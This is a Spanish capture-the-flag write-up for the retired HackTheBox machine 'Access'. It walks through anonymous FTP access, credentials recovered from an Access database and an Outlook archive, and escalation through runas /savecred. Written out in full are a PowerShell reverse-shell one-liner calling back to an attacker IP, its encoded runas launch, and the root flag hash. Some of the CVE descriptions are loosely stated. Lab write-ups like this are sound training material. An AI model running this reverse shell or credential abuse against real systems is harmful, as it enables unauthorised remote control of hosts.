---
title: "Access HTB"
machine: "Access"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["CVE", "XSS", "RCE", "Privesc", "FTP"]
retired: true
summary: "empezamos con un escaneo de reconocimiento de puertos"
draft: false
---
# Reconocimiento

empezamos con un escaneo de reconocimiento de puertos

```jsx
❯ sudo nmap 10.129.31.131 -p- --open --min-rate 5000 -Pn -n -oG target
[sudo] contraseña para kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 11:59 -0400
Nmap scan report for 10.129.31.131
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http
```

identificamos 3 servicios ftp,telnet y http ahora procedemos a un escaneo de version scripts basicos y deteccion de vulnerabilidades

```jsx
❯ sudo nmap 10.129.31.131 -p 23,21,80 -sCV -Pn -n --script vuln -oN targetedd
[sudo] contraseña para kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 12:16 -0400
Nmap scan report for 10.129.31.131
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_services:7.5: 
|     	PACKETSTORM:180580	10.0	https://vulners.com/packetstorm/PACKETSTORM:180580	*EXPLOIT*
|     	MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-	10.0	https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-	*EXPLOIT*
|     	CVE-2010-3972	10.0	https://vulners.com/cve/CVE-2010-3972
|     	SSV:20122	9.3	https://vulners.com/seebug/SSV:20122	*EXPLOIT*
|     	CVE-2010-2730	9.3	https://vulners.com/cve/CVE-2010-2730
|     	SSV:20121	4.3	https://vulners.com/seebug/SSV:20121	*EXPLOIT*
|     	PACKETSTORM:180584	4.3	https://vulners.com/packetstorm/PACKETSTORM:180584	*EXPLOIT*
|     	MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-	4.3	https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-	*EXPLOIT*
|_    	CVE-2010-1899	4.3	https://vulners.com/cve/CVE-2010-1899
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.96 seconds
```

### 1. Resumen del Sistema Operativo

- **Target OS:** Windows (específicamente detectado como **Windows XP** o una versión de servidor de esa era, como **Windows Server 2008 R2** debido al IIS 7.5).
- **Estado:** El host está vivo, pero el escaneo tardó bastante (240 segundos), lo cual es normal cuando se ejecutan scripts de la categoría `-script vuln`.

---

### 2. Análisis de Puertos y Servicios

### **Puerto 21 (FTP) - Microsoft ftpd**

- **Vulnerabilidad Crítica:** El script `vulners` identifica una vulnerabilidad de **Desbordamiento de Búfer (BOF)** relacionada con comandos IAC (`MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-`).
- **Impacto:** Principalmente Denegación de Servicio (DoS), pero en versiones antiguas de IIS, algunos BOF pueden llevar a ejecución remota de código (RCE).

### **Puerto 23 (Telnet) - Microsoft Windows XP telnetd**

- **Riesgo:** Telnet es un protocolo inherentemente inseguro (envía todo en texto plano, incluyendo contraseñas). La presencia de un demonio de Telnet en un Windows XP sugiere una configuración de legado muy débil. Es un vector ideal para ataques de fuerza bruta.

### **Puerto 80 (HTTP) - Microsoft IIS 7.5**

Aquí es donde se concentran los hallazgos más graves:

- **CVE-2010-2730 (Score 9.3):** Una vulnerabilidad crítica en el manejo de peticiones HTTP que permite **Ejecución Remota de Código (RCE)**. El atacante puede enviar paquetes diseñados para tomar control total del servidor.
- **CVE-2010-3972 (Score 10.0):** Vulnerabilidad máxima. Está relacionada con la forma en que el servicio carga ciertas librerías o maneja memoria, permitiendo compromiso total.
- **MS10-065:** Un parche de Microsoft antiguo que soluciona una vulnerabilidad de ASP que permitía ataques de DoS y potencialmente elevación de privilegios.

# Enumeracion

primero vemos que tenemos con ftp iniciando en seccion nula y efectivamente lo permite 

![image.png](/img/access/1.png)

tenemos 2 directorios con cositas muy interesantes 

![image.png](/img/access/2.png)

![image.png](/img/access/3.png)

<aside>
💡

los archivos estaban corruptos debido a que no entre en modo binary en ftp simplemente es entrar en ese modo y repetir los pasos

</aside>

### 1. **backup.mdb (Microsoft Access Database)**

- **Tipo de archivo:** Base de Datos de Microsoft Access (motor Jet).
- **Función en el escenario:** Este archivo representa una copia de seguridad de una base de datos de un sistema de control de accesos (posiblemente un software de gestión de empleados o seguridad física).
- **Relevancia técnica:** Contiene la estructura organizacional del objetivo, incluyendo tablas de usuarios (`auth_user`), detalles de seguridad (`SECURITYDETAILS`) y registros de configuración. En auditorías, estos archivos son críticos ya que suelen almacenar credenciales de administración, PINs o información personal que puede ser reutilizada para ataques de movimiento lateral o ingeniería social.

### 2. **Access Control.zip (Archivo Comprimido)**

- **Tipo de archivo:** Archivo comprimido ZIP con cifrado **AES-256** (indicado por el método de compresión 99).
- **Contenido detectado:** Contiene un archivo con extensión **.pst** (*Personal Storage Table*).
- **Relevancia técnica:** El archivo `.pst` es un formato propietario de Microsoft Outlook utilizado para almacenar copias locales de mensajes de correo electrónico, contactos y calendarios. La presencia de este archivo sugiere la existencia de comunicaciones internas que podrían contener información sensible, como contraseñas de red, procedimientos operativos o chats de soporte técnico. Al estar cifrado, requiere que el atacante primero encuentre la clave (probablemente oculta en la base de datos `.mdb`) para acceder a su contenido.

primero revisamos la backup 

![image.png](/img/access/4.png)

En la tabla `auth_user`, el usuario **engineer** tiene una contraseña que rompe con el patrón genérico de "admin":

- **Usuario:** `engineer`
- **Contraseña:** `access4u@security`

Esta es, con toda seguridad, la clave que protege el archivo ZIP.

![image.png](/img/access/5.png)

ahora veremos que info fue comprometida por correo

Tras convertir el archivo **.pst** a formato **.mbox** utilizando la herramienta `readpst`, se realizó un análisis de las comunicaciones internas. Se identificó un correo electrónico enviado por **john@megacorp.com** en el que se notificaba el cambio de contraseña de la cuenta `security`. Utilizando estas credenciales (`security`:`4Cc3ssC0ntr0ller`

antes de pasar a explotar esas credenciales encontradas seguire enumerando para tener una imagen completa del objetivo y poder armar una cadena de ataque formidable

asi se ve el codigo fuente de la pag web 

![image.png](/img/access/6.png)

### Análisis del Código Fuente (Puerto 80)

1. **Nombre del Host (`LON-MC6`):**
Este es el nombre interno del servidor dentro de la red de **MegaCorp**. En un entorno real, esto te ayuda a mapear la convención de nombres de la empresa (ej. LON podría significar London, y MC el departamento).
2. **Tecnología Obsoleta:**
El uso de `HTML 4.01 Transitional` refuerza lo que vimos en el escaneo de Nmap: estamos ante un sistema **legacy** (antiguo). Microsoft IIS 7.5 suele correr sobre Windows Server 2008 R2 o Windows 7, sistemas que ya no reciben soporte oficial.
3. **Imagen `out.jpg`:**
Muchas veces, estas imágenes en retos de HTB contienen metadatos ocultos (**Esteganografía**).

![image.png](/img/access/7.png)

Parece que la imagen out.jpg está "limpia" en cuanto a metadatos se refiere. No hay comentarios sospechosos, perfiles ICC extraños ni coordenadas GPS que delaten información adicional. En este caso, la imagen funciona puramente como un elemento decorativo del servidor LON-MC6.

pasare a la explotacion ahora si es nesesario volvere a enumerar http a profundidad

# Explotacion

y estamos dentro 

![image.png](/img/access/8.png)

asi obtivimos la primera flag 

![image.png](/img/access/9.png)

# Post explotacion (enumeracion)

```jsx
C:\Users\security>systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          5/3/2026, 4:28:19 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     6,143 MB
Available Physical Memory: 5,425 MB
Virtual Memory: Max Size:  12,285 MB
Virtual Memory: Available: 11,559 MB
Virtual Memory: In Use:    726 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
```

- **Arquitectura:** x64 (AMD64).
- **Versión:** 6.1.7600 (Sin Service Pack 1 visible, lo que suele indicar vulnerabilidades de kernel).

<aside>
💡

antes de intentar un sploit de kernel vere si tiene mala configuracion 

</aside>

![image.png](/img/access/10.png)

despues de buscar un rato encontre una mala configuracion que me permitira una escalada en caso de fallar me decantare por un exploit de kernel 

![image.png](/img/access/11.png)

### El concepto: Stored Credentials (MS-CREDS)

Cuando un administrador gestiona múltiples servidores, a veces usa el flag `/savecred` con el comando `runas`. Esto guarda la credencial en el **Windows Credential Manager**.

**Por qué esto es oro para un atacante:**
Windows permite que *cualquier* proceso iniciado por *cualquier* usuario acceda a esas credenciales guardadas para ejecutar algo, **sin pedir la contraseña de nuevo**. El sistema operativo simplemente verifica: *"¿Hay una credencial guardada para ACCESS\Administrator? Sí. Pues úsala"*.

# Escalada de privilegios

aprovechando esto abrire un reverse shell como administrator 

![image.png](/img/access/12.png)

este metodo funciono a medias ya que si me dio una reverse shell como administrador pero estaba ciega

### Enfoque 1: Ejecución en Memoria - Reverse Shell (Blind Shell)

El primer instinto ofensivo fue obtener una consola interactiva de Administrador. Para evadir restricciones de ejecución de scripts y problemas con caracteres especiales (comillas, pipes) al anidar comandos en `runas`, se optó por generar un payload de PowerShell codificado en Base64.

**1. Generación del Payload en la máquina atacante (Kali):**
Creamos un *One-Liner* de PowerShell (`TCPClient`) apuntando a nuestra IP y puerto, y lo codificamos en formato UTF-16LE a Base64.

Bash

`echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.254",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf16le | base64 -w 0`

**2. Ejecución del Payload en la máquina víctima:**
Lanzamos el comando codificado utilizando el contexto del administrador.

DOS

`runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgA1ADQAIgAsADQANAAzACkAOw...[TRUNCATED]..."`

**Resultado (Troubleshooting):**
La conexión se recibió exitosamente en el listener de Netcat (`nc -lvnp 443`), obteniendo un prompt `PS C:\Windows\system32>`. Sin embargo, debido a limitaciones en el manejo de flujos de salida (*piping*) de objetos en versiones antiguas de PowerShell (PowerShell v2 en Windows Server 2008 R2), la consola resultó ser una **Blind Shell** (Shell Ciega). Los comandos se ejecutaban en el servidor, pero el *stdout* no era devuelto a través del socket TCP.

**este metodo en un sistema moderno funcionaria perfectamente**

![image.png](/img/access/13.png)

### Enfoque 2: Exfiltración Local Evadiendo ACLs (Método Exitoso)

Debido a la inestabilidad de la reverse shell por la red, se pivotó hacia una estrategia de **Living off the Land (LotL)** utilizando exclusivamente binarios nativos locales (`cmd.exe`) desde nuestra sesión estable de Telnet.

El objetivo era leer la flag de root (`C:\Users\Administrator\Desktop\root.txt`).

**Intento fallido (Restricciones NTFS):**
El intento inicial de copiar el archivo al escritorio del usuario `security` mantuvo intactas las Listas de Control de Acceso (ACLs) originales. Como el Administrador ejecutó la copia, seguía siendo el propietario absoluto del archivo, resultando en un error de `Access is denied` al intentar leerlo con el usuario de bajos privilegios.

**Bypass definitivo (Redirección a `Public`):**
Para evadir la retención de permisos de NTFS, se le indicó al Administrador que leyera el contenido de la flag en memoria y redirigiera la salida de texto hacia un archivo completamente nuevo en el directorio `C:\Users\Public`. Los archivos creados en este directorio heredan permisos globales de lectura para cualquier usuario del sistema.

**1. Comando de Explotación:**

DOS

`runas /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\flag_final.txt"`

**2. Obtención de la Flag:**
Al haberse creado un archivo nuevo con permisos neutros, procedimos a leer el hash directamente con nuestro usuario inicial.

DOS

`C:\Users\security> type C:\Users\Public\flag_final.txt
a894e160528e124164682ef72300b39e`

![image.png](/img/access/14.png)

**Conclusión:** La máquina fue comprometida en su totalidad demostrando la importancia de adaptar las técnicas de post-explotación frente a fallos de red o configuraciones estrictas de permisos a nivel de sistema de archivos.
